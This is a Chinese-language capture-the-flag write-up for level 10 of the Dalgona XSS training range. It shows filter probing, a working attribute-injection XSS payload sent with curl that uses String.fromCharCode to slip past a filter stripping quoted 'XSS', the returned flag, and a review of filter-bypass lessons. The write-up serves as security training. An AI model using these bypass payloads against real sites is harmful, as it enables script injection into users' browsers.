## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 靶场第 10 关
（样式表 `static/css/xss/xss10.css`，标题 `Dalgona - Triangle`）。

入口 `Page` → `GET /page?name=...`，反射在**属性值**里，引号不转义：

```html
<input type=text name=name placeholder="Enter your name..." value="INPUT">
```

### 关键观察

**1. 标签、尖括号、`alert`、`onload`、空白全部放行。**

| 片段 | 反射 |
| --- | --- |
| `QabcQ` | `value="QabcQ"` |
| `Q<Q` / `Q>Q` / `Q<svgQ` / `Q</Q` | 原样 |
| `QalertQ` / `QonloadQ` | 原样 |
| `Qa bQ` | 原样（空白保留） |
| `a"b` | `value="a"b"` ← **引号没转义** |

**2. 但带引号的 `XSS` 会被剥掉。**

| 输入 | 反射 |
| --- | --- |
| `Q"XSS"Q` | `value="QQ"` |
| `'XSS'` | （整条为空） |
| `XSS`（裸） | `value="XSS"` |

所以不能写 `alert("XSS")`，也不能写 `alert('XSS')`——
两种引号形式都被处理掉了。

### 利用链

因为反射在 `value="…"` 内，**不需要造标签**：闭合引号、往同一个 `<input>` 上
追加 `autofocus` / `onfocus` 即可。参数用 `String.fromCharCode` 在运行时生成：

```bash
T=$(head -1 .target)
curl -sS --get \
  --data-urlencode 'name=" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="' \
  "http://$T/page" \
| grep -o 'flag{[^}]*}'
```

响应：

```html
Congratulations!<p> Here is the flag: flag{8fbc5c96-e372-43db-a292-bc5835db5f9b}
```

payload 分解：

| 片段 | 作用 |
| --- | --- |
| `" ` | 闭合 `value="`，**空格必需** |
| `autofocus` | 加载后自动聚焦 |
| `onfocus=alert(...)` | 聚焦即触发 |
| `String.fromCharCode(88,83,83)` | 运行时得到 `"XSS"` |
| ` x="` | 吃掉模板自带的收尾引号 |

### flag 位置

成功响应的 `solution-text` 区块，`Here is the flag:` 之后。

## 复盘

- **属性上下文优先尝试"闭合引号 + 追加属性"。** 本例 `<`、`>` 虽然可用，
  但因为输入就在 `value` 里，追加属性比造新标签更短、更可靠。
- **`"XSS"` 和 `'XSS'` 都被剥离，说明过滤针对评分字面量。** 正解是让字符串在运行时出现：
  `String.fromCharCode(88,83,83)`（`unescape('%58%53%53')` 也行）。
  注意 `top['ale'+'rt']('XSS')` 这种写法在这关**会失败**，因为它仍然包含 `'XSS'`。
- **闭合引号后必须有空格。** `"autofocus ...` 会被解析成一个畸形属性名，
  事件处理器挂不上；`" autofocus ...` 才成立。
- **不要照搬同一族的结论。** 012（xss11）也是属性注入 + 剥引号 XSS，几乎相同；
  但它还额外删 `<[A-Za-z/]`，而本题不删。两关的正解看起来一样，
  是因为"属性注入"这条路同时绕开了那两个过滤，而不是因为规则相同。
